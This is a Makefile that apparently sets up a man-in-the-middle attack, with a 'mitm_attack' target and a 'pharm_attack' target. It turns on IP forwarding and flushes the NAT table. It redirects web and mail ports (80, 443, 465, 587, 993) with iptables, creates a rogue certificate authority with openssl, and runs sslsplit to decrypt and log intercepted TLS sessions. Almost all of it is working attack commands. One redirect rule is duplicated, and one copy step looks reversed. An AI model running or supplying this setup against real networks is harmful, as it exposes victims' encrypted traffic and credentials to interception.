EXE = mitm_attack
LOGDIR = logdir
SSLSPLIT = sslsplit
all: $(EXE)

install:
	pip install wheel
	pip install --pre scapy[basic]
	pip install netifaces

mitm_attack: mitm_attack.py
	[ -d $(LOGDIR) ] || mkdir -p $(LOGDIR)
	[ -d $(SSLSPLIT) ] || mkdir -p $(SSLSPLIT)

	sudo bash -c 'echo "1" > /proc/sys/net/ipv4/ip_forward' 
	
	sudo iptables -t nat -F
	sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
	sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
	sudo iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443
	sudo iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443
	sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
	sudo iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443

	openssl genrsa -out ca.key 4096
	openssl req -new -x509 -days 1826 -key ca.key -out ca.crt
	sudo sslsplit -d -l connections.log -j $(SSLSPLIT) -S $(LOGDIR) -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 &
	cp $@ $^
	chmod u+x $@

pharm_attack: pharm_attack.py

clean:
	-rm -rf logdir sslsplit
	-rm -f ca.key ca.crt
	-rm $(EXE)